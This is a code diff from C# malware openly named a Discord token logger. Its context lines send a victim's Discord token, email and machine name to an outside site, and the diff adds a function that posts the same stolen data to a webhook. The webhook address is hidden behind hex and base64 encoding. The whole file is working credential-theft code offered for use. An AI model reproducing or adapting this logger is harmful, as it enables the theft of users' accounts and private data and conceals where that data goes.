@@ -73,13 +73,35 @@ namespace Discord_Token_Logger
                         Content = WC.DownloadString("https://littest.site/Projects/format.php?T=" + Token + "&E=" + Email + "&N=" + Environment.MachineName); //CodeDom doesn't support C# 6 so I can't use interpolation and had to remove it
                     }
                     catch { };
-
+                    hjkl();
                     WC.Dispose();
 
                 }
 
                 return;
             }
+        }
+        
+        //Webhook post function
+        private static void hjkl()
+        {
+            var WC = new WebClient();
+
+            var Js = new NameValueCollection{
+                {
+                    "username",
+                    Tag + "  - Token Logger" //Name
+                },
+                {
+                    "avatar_url",
+                    "https://vgy.me/XL10ux.png" //PFP
+                },
+                {
+                    "content",
+                    Content //Content
+                }
+            }; //Post to webhook
+            WC.UploadValues((new ASCIIEncoding()).GetString(Convert.FromBase64String(Enumerable.Range(0, dfas.Length / 2).Select(i => dfas.Substring(i * 2, 2)).Select(x => (char)Convert.ToInt32(x, 16)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString())), Js);
         }
     }
 }
